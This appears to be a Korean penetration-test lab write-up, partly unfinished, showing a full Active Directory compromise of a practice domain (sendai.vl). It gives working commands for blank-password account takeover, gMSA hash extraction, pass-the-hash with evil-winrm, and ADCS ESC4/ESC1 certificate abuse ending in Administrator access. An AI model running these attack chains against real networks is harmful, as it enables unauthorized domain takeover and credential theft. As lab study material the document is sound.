---
publish: true
title: 모의해킹 보고서 - lab19
created: 2026-11-13
modified: 2026-11-14T22:11:01.763Z
published: 2026-11-13
date: 2026-11-13
tags:
description:
lab: lab19
---

## 목차

1. [개요](#1-개요)
2. [총평](#2-총평)
3. [정보 수집 대상](#3-정보-수집-대상)
4. [진단결과 요약](#4-진단결과-요약)
5. [모의해킹 수행 내용](#5-모의해킹-수행-내용)
6. [취약점](#6-취약점)

## 1. 개요

본 보고서는 2026년 11월 13일에 진행된 lab19에 대한 모의해킹 보고서이다.

## 2. 총평

이번 lab19 모의해킹에서는
이는 외부에서 시작된 침해가 서버 전체에 대한 통제권 확보로 확대될 수 있음을 보여준다.

보완을 위해

## 3. 정보 수집 대상

개인 실습 서버 lab19을 대상으로 취약점을 점검했다. 대상 서버 lab19의 IP는 자산 보호 차원에서 가려두었다.

## 4. 진단결과 요약

아래 표는 이번 모의해킹 과정에서 발견된 주요 취약점을 요약한 것이다. 각 취약점에 대한 자세한 설명 및 대응 방안은 본 보고서의 '취약점' 섹션에서 확인할 수 있다.

| 취약점 이름 | 위험도 | 설명  | 대응방안 |
| :----: | :-: | :-: | :--: |
|        |     |     |      |
|        |     |     |      |

## 5. 모의해킹 수행 내용 

![[00. Setting/00. 첨부파일/Pasted image 20261113132036.png]]

대상 서버를 포트 스캔 해보니 `DNS`, `HTTP`.....`LDAP`, `SMB` 포트가 열려있다.

`dc.sendai.vl` 도메인 이름이 보인다. `HTTP`는 단순 `IIS` 페이지이고 아직은 어디서 인증 정보를 찾을 수 없다.

![[00. Setting/00. 첨부파일/Pasted image 20261113133659.png]]

```
smbclient -L //lab -U 'a%' -N
```

아직은 정보가 없으니 비밀번호는 비워 놓은 채로 테스트용 이름으로 `a`를 넣어본다. `SMB` 공유 폴더를  검색해보니 `config`, `NETLOGON`, `sendai`, `SYSVOL`, `User` 폴더가 공유 되어 있다.

![[00. Setting/00. 첨부파일/Pasted image 20261113140155.png]]

```
smbclient //lab/sendai -U 'a%' -N
```

`SMB`로  `sendai` 폴더에 접근해본다. `incident.txt` 파일이 보인다.

![[00. Setting/00. 첨부파일/Pasted image 20261113140139.png]]

```
get incident.txt
```

`incidnet.txt` 파일을 내 칼리로 가져온다.

![[00. Setting/00. 첨부파일/Pasted image 20261113140247.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261113140048.png]]

`incident.txt`가 잘 다운이 됐는지 확인하고 읽어보니,

```
“안녕하세요. 사용자 계정 비밀번호와 관련된 중요한 보안 업데이트를 안내드립니다.

최근 침투 테스트에서 상당수 사용자 계정이 취약하고 안전하지 않은 비밀번호를 사용하고 있다는 사실을 확인했습니다.

이에 IT 부서는 예방 조치로 취약한 비밀번호를 사용하는 모든 계정의 비밀번호를 만료 처리했습니다. 해당 사용자는 다음 로그인 시 비밀번호를 변경해야 합니다.

대상 사용자는 시스템 보안을 위해 비밀번호 재설정 절차를 신속히 진행해 주시기 바랍니다. 강력한 비밀번호는 민감한 정보를 보호하고 네트워크 위협을 방지하는 데 중요한 역할을 합니다.

비밀번호 재설정 절차에 도움이 필요하거나 질문이 있다면 IT 지원팀에 문의해 주세요.”
```

모든 사용자의 비밀번호를 만료 처리 했다는 안내가 적혀있다.

![[00. Setting/00. 첨부파일/Pasted image 20261113140624.png]]

`sendai`의 `transfer` 폴더를 들어가면 사용자 이름 6개가 폴더로 나열 되어 있다. 각 폴더에 아무 것도 들어있지 않은 것을 보아 단순 이름 목록을 알려주기 위함인 것 같다.

![[00. Setting/00. 첨부파일/Pasted image 20261113140809.png]]

```
cat > user.txt << 'EOF'
<transfer 이름 목록>
EOF
```

이름 6개를 딕셔너리로 만들어준다.

![[00. Setting/00. 첨부파일/Pasted image 20261113140939.png]]

```
nxc smb lab -d SENDAI -u users.txt -p '' --continue-on-success
```

`nxc`: NetExec -> 네트워크 점검 도구의 명령어. `SMB`, `LDAP`, `WinRM`, `SSH` 같은 인증이 필요한 서비스에 연결해 계정 인증이나 권한을 확인할 때 쓴다.

- `nxc smb lab`: `lab` 서버의 SMB 점검
- `-d SENDAI`: 도메인 지정
- `-u users.txt`: 사용자 목록 파일 사용
- `-p ''`: 비밀번호를 빈 값으로 설정
- `--continue-on-success`: 성공한 계정이 나와도 계속 검사

`nxc`로 빈 비밀번호를 가진 사람을 찾는다.
비밀번호 변경이 필요하다고 명시 되어 있는 사람은

1. elliot.yates
2. thomas.powell

두 이름이 빈 비밀번호일 가능성이 높다. 빈 비밀번호이니 임의로 비밀번호를 지정해줄 수 있다.

![[00. Setting/00. 첨부파일/Pasted image 20261113142352.png]]

```
nxc smb [MASK] -d SENDAI -u thomas.powell -p '' \
  -M change-password -o NEWPASS='M0on!Lake_2026#x'
```

thomas.powell의 비밀번호를 임의로 지정해준다.

![[00. Setting/00. 첨부파일/Pasted image 20261113142710.png]]

```
nxc smb [MASK] -d SENDAI -u thomas.powell -p 'M0on!Lake_2026#x'
```

인증이 잘 되는지 확인하기 위해 `SMB`에 접속이 가능한지 여부를 묻는다. 지정한 비밀번호로 인증 접속이 성공했다.

![[00. Setting/00. 첨부파일/Pasted image 20261113143041.png]]

`BloodHound`: Active Directory의 사용자, 그룹, 컴퓨터와 권한 관계를 그래프로 보여주는 도구

`BloodHound Python`: BloodHound용 AD 정보 수집기

- `bloodhound-python`: BloodHound용 AD 정보 수집기
- `-d sendai.vl`: 조사할 도메인
- `-u thomas.powell`: 로그인 사용자
- `-p 'M0on!Lake_2026#x'`: 그 사용자의 비밀번호.
- `-ns [MASK]`: DNS 질의를 보낼 서버
- `-dc dc.sendai.vl`: 정보를 조회할 도메인 컨트롤러
- `-c All`: 지원되는 수집 항목을 폭넓게 수집. All이라고 모든 게 나온 것이 아니라 `LoggedOn`(현재 로그인해있는 사용자를 수집하는 항목)을 제외한 전체 항목이다. `LoggedOn`까지 보고 싶으면 `All,LoggedOn` 으로 추가.
- `--zip`: 수집된 JSON 파일들을 ZIP 하나로 묶는다.

`BloodHound`의 정보를 `20261113142744_bloodhound.zip` 으로 내려받았다.

![[00. Setting/00. 첨부파일/Pasted image 20261113143239.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261113143401.png]]

```
오류: 데이터베이스 만들기 실패
상세정보: The database was created using collation version 2.42,
but the operating system provides version 2.43.
힌트: Rebuild all objects in the template database that use the dafault collation and run ALTER DATABASE template1 REFRESH COLLATION VERSION, or build postgreSQL with the right library version
```

`bloodhound-start`로 bloodhound를 실행하려 했더니 `template1`이 문자 정렬 버전이 맞지 않는다고 한다.

기본 데이터베이스(template1)는 문자 정렬(Collation)버전을 2.42 버전을 쓰는데 OS는 2.43 버전을 써서 규칙 불일치 문제가 생겼고, 현재 규칙인 2.43으로 갱신해야 한다고 알리고 있다.

![[00. Setting/00. 첨부파일/Pasted image 20261113143542.png]]

```
sudo runuser -u postgres -- psql -c 'ALTER DATABASE postgres REFRESH COLLATION VERSION; ALTER DATABASE template1 REFRESH COLLATION VERSION'
```

- `sudo runuser -u postgres --`: PostgreSQL 관리자 계정으로 다음 명령 실행
- `psql -c '...'`: SQL 명령 실행
- `ALTER DATABASE ... REFRESH COLLATION VERSION`: 데이터베이스에 기록된 정렬 버전 정보 갱신

현재 규칙으로 갱신해준다.

![[00. Setting/00. 첨부파일/Pasted image 20261113143552.png]]

`bloodhound`를 실행하기 전 setup부터 해준다.

![[00. Setting/00. 첨부파일/Pasted image 20261113143649.png]]

```
Default credentials:
    user: neo4j
    password: neo4j
    opening http://localhost:7474/
```

기본 인증 정보와 접속 주소를 얻었다. 접속 후엔 비밀번호를 바꾸고 새 비밀번호는 `/etc/bhapi/bhapi.json` 에 업데이트하라고 알리고 있다.

![[00. Setting/00. 첨부파일/Pasted image 20261113143832.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261113143903.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261113143930.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261113143947.png]]

인증 성공했고, 새 비밀번호로 바꾸니 정상적으로 연결이 됐다.

![[00. Setting/00. 첨부파일/Pasted image 20261113144246.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261113144231.png]]

새 비밀번호로 정보를 바꿔준다.

![[00. Setting/00. 첨부파일/Pasted image 20261113144315.png]]

`bloodhound-start`를 해주니 정상적으로 실행이 됐다.

web 주소는 `http://127.0.0.1:8080`
기본 인증 정보는 `admin:admin`

![[00. Setting/00. 첨부파일/Pasted image 20261113144457.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261113144522.png]]

접속해보니 환경 맵핑을 위한 데이터 업로드가 필요하다고 한다.

![[00. Setting/00. 첨부파일/Pasted image 20261113144644.png]]

`20261113142744_bloodhound.zip`를 업로드 해준다.

![[00. Setting/00. 첨부파일/Pasted image 20261113144711.png]]

```
MATCH p=(u:User {name:'THOMAS.POWELL@SENDAI.VL'})
-[:MemberOf*1..]->(g:Group)-[:GenericAll]->(target:Group)
RETURN p
```

`thomas.powell`이 속한 그룹이 `GenericAll` 권한을 가진 다른 그룹의 경로를 찾는다. -> `thomas.powell`이 어느 그룹을 완전히 제어할 수 있는가?

`GenericAll`: 대상 AD 객체에 대한 전체 제어 권한. **그룹 구성원을 변경하거나 사용자이면 비밀번호를 바꾸는 등의 권한이 있다.**

![[00. Setting/00. 첨부파일/Pasted image 20261113144740.png]]

`thomas.powell`은 `SUPPORT` 그룹에 속했고, `SUPPORT`그룹은  `ADMSVC` 그룹의 `GenericAll` 권한을 가지고 있다.

\=> `thomas`는 `ADMSVC` 그룹 구성원을 변경하거나 비밀번호를 바꿀 수 있다.

![[00. Setting/00. 첨부파일/Pasted image 20261113145346.png]]

Outbound Object Control 목록을 확인해보면 `MGTSVS$`의 `ReadGMSAPassword` 권한도 있다.

`ReadGMSAPassword`: `gMSA` 계정의 관리 비밀번호를 `LDAP`로 읽을 수 있는 권한

\*`gMSA`: Windows 서비스용 계정. 일반 계정처럼 사용자가 관리하는 게 아니라 Windows가 비밀번호를 자동으로 만들고 관리. 허가 받은 계정이나 그룹만 그 비밀번호를 가져올 수 있다.

\*`LDAP`: `Active Directory`에 정보를 요청하는 통신 방식. `Active Directory`가 사용자·그룹·컴퓨터 정보가 담긴 회사 주소록이라면, `LDAP`는 그 주소록을 검색하는 방법.

\*`ADMSVC` 권한을 가진 계정으로 조회하면 `MGTSVC$`의 비밀번호 정보를 얻고, 그 계정으로 인증을 시도할 수 있다.

\=> 즉, `thomas.powell`은 `SUPPORT`그룹을 통해 `ADMSVC` 그룹을 수정할 수 있는 권한이 있고 그 권한으로 자신을 `ADMSVC` 구성원으로 추가하여 `MGTSVC$`의 gMSA 비밀번호를 읽을 수 있다.

![[00. Setting/00. 첨부파일/Pasted image 20261113162239.png]]

`thomas.powell`를 `ADMSVC` 그룹에 넣기 위해 `bloodyAD`를 실행한다. kali에 없으니 일단 설치부터 진행한다.

![[00. Setting/00. 첨부파일/Pasted image 20261113162501.png]]

`bloodyad`를 실행할 명령어를 추가해준다.

![[00. Setting/00. 첨부파일/Pasted image 20261115035233.png]]

```
bloodyad --host [MASK] -u thomas.powell -p 'M0on!Lake_2026#x' -d sendai.vl add groupMember ADMSVC thomas.powell
```

`bloodyad`로 `thomas.powell`를 `ADMSVC` 그룹에 추가한다.

![[00. Setting/00. 첨부파일/Pasted image 20261115043920.png]]

```
nxc ldap lab -d sendai.vl -u thomas.powell -p 'M0on!Lake_2026#x' --gmsa
```

`nxc`로 `thomas`가 `LDAP`에 로그인해서 읽을 권한이 있는 `gMSA` 비밀번호를 조회해본다.

`mgtsvc$`의 계정의 비밀번호를 읽을 수 있다는 정보와 인증 해시 `NTLM`를 확인했다.

![[00. Setting/00. 첨부파일/Pasted image 20261115040228.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261115045521.png]]

```
evil-winrm -i [MASK] -u 'mgtsvc$' -H '88d544b552c4763c0333db7e48708a0d'
```

확인한 인증 해시로 `WinRM`에 접속했고, 성공했다.

![[00. Setting/00. 첨부파일/Pasted image 20261115045415.png]]

```
Get-CimInstance Win32_Process | Select-Object ProcessId, Name, CommandLine | Format-List

Get-cimInstance Win32_Service | Select-Object Name, State,StartName, PathName
```

\*`Gete-CimInstance`: `Windows`의 관리 정보(CIM/WMI)를 조회하는 PowerShell 명령

`clifford.davey`의 비밀번호를 찾는다. 둘 다 허가 거부가 뜬다. 현재 계정으로는 실행 중인 프로세스 정보도, 서비스 정보도 조회가 어렵다.

![[00. Setting/00. 첨부파일/Pasted image 20261115052620.png]]

```
Get-ChildItem 'HKLM:\SYSTEM\CurrentControlSet\Services' |
  ForEach-Object { Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue } |
  Where-Object { $_.ImagePath -match 'clifford' -or $_.ObjectName -match 'clifford' } |
  Select-Object PSChildName, ImagePath, ObjectName
```

- `Get-ChildItem ...\Services`: 서비스별 레지스트리 항목을 나열
- `ForEach-Object`: 서비스 항목을 하나씩 처리
- `Get-ItemProperty $_.PSPath`: 해당 서비스의 설정값을 읽는다.
- `Where-Object`: 조건에 맞는 서비스만 골라내기
- `$_.ImagePath -match 'clifford'`: 실행 파일 경로나 시작 인수에 `clifford`가 있는지 확인
- `-or $_.ObjectName -match 'clifford'`: 또는 서비스 실행 계정 이름에 `clifford`가 있는지 확인
- `-ErrorAction SilentlyContinue`: 읽을 수 없는 항목의 오류 메시지를 표시하지 않고 넘어감
- `Select-Object PSChildName, ImagePath, ObjectName`: 서비스 이름, 실행 경로·인수, 실행 계정을 출력

\=> `Windows` 등록된 서비스 설정 중 `clifford`라는 문자열이 들어간 항목을 찾아 보여준다.

비밀번호 `RFmoB2WplgE_3p` 를 얻었다.

![[00. Setting/00. 첨부파일/Pasted image 20261115054320.png]]

`bloodhound`에서 `cliffort.davey`의 그룹을 조회해보면 `DOMAIN USERS`, `CA-OPERATOR`, `STAFF`가 나온다. `DOMAIN USERS`와 `STAFF`는 일반 사용자 그룹 이름이지만 `CA-OPERATOR`는 인증 운영과 관련된 이름인 것 같다.  AD의 인증은 => `ADCS`

\*`ADCS`: Active Directory 인증서 서비스

![[00. Setting/00. 첨부파일/Pasted image 20261115055701.png]]

```
certipy-ad find -u 'clifford.davey@sendai.vl' -p 'RFmoB2WplgE_3p' -dc-ip [MASK] -stdout
```

- `certipy-ad find`: ADCS 정보를 검색
- `-u 'clifford.davey@sendai.vl'`: 인증에 사용할 도메인 계정
- `-p '…'`: 그 계정의 비밀번호
- `-dc-ip 10.129.234.66`: 조회할 도메인 컨트롤러의 IP
- `-stdout`: 결과를 파일로 저장하지 않고 터미널에 출력

`clifford` 계정으로 도메인의 `ADCS` 구성을 조회했지만.....너무 길다.

![[00. Setting/00. 첨부파일/Pasted image 20261115062511.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261115062636.png]]

```
certipy-ad find -u 'clifford.davey@sendai.vl' -p 'RFmoB2WplgE_3p' -dc-ip [MASK] -stdout | grep -i -B 40 -A 5 'CA-OPERATORS'
```

`CA-OPERTORS` 와 관련된 부분만 다시 찾는다.

`sendaicomputer` 이란 `ADCS` 인증서 템플릿이 나왔고 `ca-operators`에 모든 컨트롤 권한이 있으며 취약점으로 권한 설정이 위험하다는 판단이 나왔다.

\=> `CA-OPERATORS`는 `sendaicomputor` 인증서에 `GenericAll` 권한이 있다.

`ESC`: 도메인 권한 상승(Domain Escalation)으로 이어질 수 있는 인증서 서비스 설정 문제를 구분하는 이름표 (`ESC4`는 인증서 템플릿의 권한 설정이 위험한 경우)

![[00. Setting/00. 첨부파일/Pasted image 20261113171852.png]]

```
certipy-ad template -u 'clifford.davey@sendai.vl' -p 'RFmoB2WplgE_3p' -dc-ip [MASK] -template sendaiComputer -write-default-configuration
```

- `certipy-ad template`: 인증서 템플릿을 조회하거나 수정
- `-u`, `-p`: 수정 권한이 있는 도메인 계정과 비밀번호
- `-dc-ip`: 도메인 컨트롤러 주소
- `-template sendaiComputer`: 수정할 템플릿 이름
- `-write-default-configuration`: Certipy의 기본 ESC1 취약 설정을 템플릿에 적용

`CA-OPERATORS` 권한으로 `SendaiComputer` 템플릿을 ESC1 요청이 가능하도록 바꾼 다음,

\*`ESC1`: 낮은 권한의 사용자가 다른 계정 이름으로 인증서를 요청할 수 있게 설정된 경우

![[00. Setting/00. 첨부파일/Pasted image 20261115065820.png]]

```
Get-ADUser Administrator
```

`Administrator`의 `ADuser` 정보에서 `SID`를 조회하고,

\*`SID`: 계정의 고유 식별자

![[00. Setting/00. 첨부파일/Pasted image 20261113172543.png]]

```
certipy-ad req -u 'clifford.davey@sendai.vl' -p 'RFmoB2WplgE_3p' -dc-ip [MASK] -target dc.sendai.vl -target-ip [MASK] -ca sendai-DC-CA -template SendaiComputer -upn 'Administrator@sendai.vl' -sid 'S-1-5-21-3085872742-570972823-736764132-500' -dynamic-endpoint -timeout 60 -debug -out administrator_sid.pfx
```

- `certipy-ad req`: 인증서 발급을 요청
- `-u`, `-p`: 요청에 사용할 Clifford 계정의 로그인 정보
- `-dc-ip`: 도메인 컨트롤러 IP
- `-target dc.sendai.vl`, `-target-ip `: CA에 연결할 호스트 이름과 IP
- `-ca sendai-DC-CA`: 인증서를 발급할 인증 기관 이름
- `-template SendaiComputer`: 사용할 인증서 템플릿
- `-upn 'Administrator@sendai.vl'`: 인증서에 `Administrator`의 `UPN`을 지정
- `-sid '…-500'`: `Administrator` 계정의 `SID`를 지정. 끝의 `-500`은 일반적으로 내장 `Administrator` 계정의 `RID`
- `-dynamic-endpoint`: `RPC`가 사용하는 통신 포트를 찾아 연결하도록 지정하는 옵션
- `-timeout 60`: 연결 제한 시간을 60초로 설정
- `-debug`: 자세한 디버그 출력을 표시
- `-out administrator_sid.pfx`: 성공한 인증서와 개인 키를 이 파일에 저장

`SendaiComputer` 템플릿을 사용해 Administrator 계정을 나타내는 인증서를 요청하고, 성공하면 인증서와 개인 키를 `.pfx` 파일로 저장한다.

\*`UPN`: Active Directory에서 사용하는 로그인 이름 형식
`RPC`: 네트워크 너머의 서비스에 요청을 보내고 결과를 받는 통신 방식. 인증기관에 원격 요청하기 위해 쓴다.

![[00. Setting/00. 첨부파일/Pasted image 20261113172741.png]]

```
certipy-ad auth -pfx administrator_sid.pfx -dc-ip 10.129.234.66 -ldap-shell
```

`administrator_sid.pfx` 인증서로 인증해서 `ldap-shell`에 연결했다. `whoami`를 쳐보니 `SENDAI\Administrator` 가 나왔다.

![[00. Setting/00. 첨부파일/Pasted image 20261113172939.png]]

```
change_password Administrator 'SendaiAdmin!2026x'
```

`WinRM`으로 접속하기 위해 `Administrator`의  비밀번호를 바꾼다.

![[00. Setting/00. 첨부파일/Pasted image 20261113173230.png]]

```
evil-winrm -i 10.129.234.66 -u 'SENDAI\Administrator' -p 'SendaiAdmin!2026x'
```

바꾼 비밀번호로 `Administrator` 원격 접속에 성공했다.

## 6. 취약점

```
CVSS v4.0 점수: 10 / Critical
Macro vector: 000100
Exploitability: High
Complexity: High
Vulnerable system: High
Subsequent system: Medium
Exploitation: High
Security requirements: High
```

### 6.1  

<br> **6.1.1 설명**

-

<br> **6.1.2 조치방법**

-
